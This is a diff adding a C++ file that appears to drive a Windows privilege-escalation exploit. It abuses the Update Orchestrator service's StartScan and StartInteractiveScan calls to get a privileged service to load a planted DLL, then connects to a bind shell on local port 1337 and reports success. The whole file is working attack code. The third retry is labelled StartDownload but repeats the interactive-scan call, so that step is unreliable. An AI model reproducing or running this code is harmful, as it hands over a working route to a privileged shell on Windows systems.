@@ -1,0 +1,60 @@
+
+#include <iostream>
+
+#include "MiniUsoClient.h"
+#include "TcpClient.h"
+
+#define TEMPO 2000
+
+int wmain(int argc, wchar_t** argv)
+{
+	TcpClient tcpClient;
+	int iRes = 0;
+
+	// Try to trigger DLL loading with 'StartScan'
+	wprintf_s(L"[*] Using UpdateOrchestrator->StartScan()\n");
+	MiniUsoClient miniUsoClient;
+	if (!miniUsoClient.Run(USO_STARTSCAN))
+		return 1;
+	
+	// Wait a bit before trying to connect to the bind shell.
+	// We might need this if the machine is slow. 
+	//wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");
+	Sleep(TEMPO);
+
+	iRes = tcpClient.connectTCP("127.0.0.1", "1337");
+
+	if (iRes != 0)
+	{
+		wprintf_s(L"[*] Retrying with UpdateOrchestrator->StartInteractiveScan()\n");
+		if (!miniUsoClient.Run(USO_STARTINTERACTIVESCAN))
+			return 2;
+
+		Sleep(TEMPO);
+
+		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
+	}
+
+	if (iRes != 0)
+	{
+		wprintf_s(L"[*] Retrying with UpdateOrchestrator->StartDownload()\n");
+		if (!miniUsoClient.Run(USO_STARTINTERACTIVESCAN))
+			return 3;
+
+		Sleep(TEMPO);
+
+		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
+	}
+
+	if (iRes != 0)
+	{
+		wprintf_s(L"[-] Exploit failed.");
+	}
+	else
+	{
+		wprintf_s(L"[+] Exploit successfull.");
+	}
+
+	return 0;
+
+}
